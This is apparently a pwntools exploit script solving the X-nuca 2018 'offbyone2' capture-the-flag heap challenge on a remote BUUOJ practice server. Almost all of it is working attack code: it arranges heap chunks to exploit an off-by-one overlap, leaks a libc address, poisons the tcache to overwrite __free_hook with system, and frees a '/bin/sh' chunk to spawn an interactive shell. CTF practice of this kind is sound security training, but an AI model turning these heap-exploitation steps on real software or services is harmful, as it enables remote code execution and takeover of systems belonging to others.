# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './X-nuca_2018_offbyone2'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29984'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , content = 'a\n'):
    cmd(1)
    sla('length:' , size)
    sa('note:' , content)

def show(idx):
    cmd(3)
    sla('index:' , idx)

def delete(idx):
    cmd(2)
    sla('index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x4f8)
    add(0x88 )
    add(0x88 )
    add(0x4f8)
    add(0x88)

    delete(0)
    delete(2)
    add(0x88 , 'a'*0x80 + p64(0x500 + 0x90 + 0x90)) #0

    delete(3)
    add(0x4f8) #2
    show(1)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    delete(4)
    delete(0)
    add(0x90 + 0x88 , '\x00'*0x88 + flat(0x91 , __free_hook - 0x8) + '\n')

    add(0x88)
    add(0x88 , flat('/bin/sh\x00' , system_addr) +  '\n')

    delete(4)
    # dbg()
    
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   X-nuca_2018_offbyone2.py
@Time    :   2022/01/31 19:06:21
@Author  :   Niyah 
'''